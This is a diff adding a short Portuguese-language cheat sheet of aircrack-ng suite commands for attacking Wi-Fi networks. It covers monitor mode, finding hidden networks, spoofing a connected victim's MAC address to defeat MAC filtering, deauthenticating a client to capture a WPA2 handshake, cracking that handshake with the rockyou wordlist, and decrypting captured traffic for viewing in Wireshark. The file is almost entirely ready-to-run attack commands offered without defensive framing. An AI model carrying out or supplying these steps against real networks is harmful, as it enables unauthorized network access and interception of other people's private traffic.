@@ -1,0 +1,38 @@
+
+airmon-ng check     (verifica processos incompativeis)
+
+airmon-ng check kill (mata os processos incompativeis)
+
+airmon-ng start wlan0   (inicia o modo de monitoramento)
+
+airodump-ng wlan0mon  (organiza o modo de monitoramento)
+
+
+Identificar rede ocultas
+
+airodump-ng wlan0mon -c 1 --bssid MAC-DO-AP   (fixa o monitoramento em um ap)
+
+service network-manager start  (volta a wifi ativa novamente)
+
+
+Burlar controles por mac
+*identificar o mac da station conectada no ap, copiar e trocar o seu pelo dele
+ifconfig wlan0 down
+macchanger -m macdavitima wlan0
+
+service network-manager  start   (starta e vai conectar automatico no ap)
+
+
+Atacar WPA2 
+*identificar o ap a ser atacado, monitorar e verificar o cliente conectado, derrubar o cliente para o mesmo se conectar novamente, nisso pegar o handshake
+*jogar todo log de saida para um arquivo .cap   (que sera quebrado posteriormente)
+airodump-ng wlan0mon -c 1 --bssid macdoap -w quebrawifi
+aireplay-ng -0 10 -a MACDOAP -c MACDOCLIENTE wlan0mon
+
+aircrack-ng quebrawifi.cap -w /usr/share/wordlists/rockyou.txt  (ou outra wordlist, aconselhavel analise para tanto wordlist grandes ou de apenas numero)
+
+
+Decriptando tráfego wpa2
+*apos capturado arquivo .cap, utilizar outra ferramenta com a senha capturada para ver o trafego em texto plano no momento da captura
+-airdecap-cap -p SENHADOWIFI arquivocaptura-01.cap -e SSIDdoWIFI  
+ -wireshark arquivocaptura-01-dec.cap 
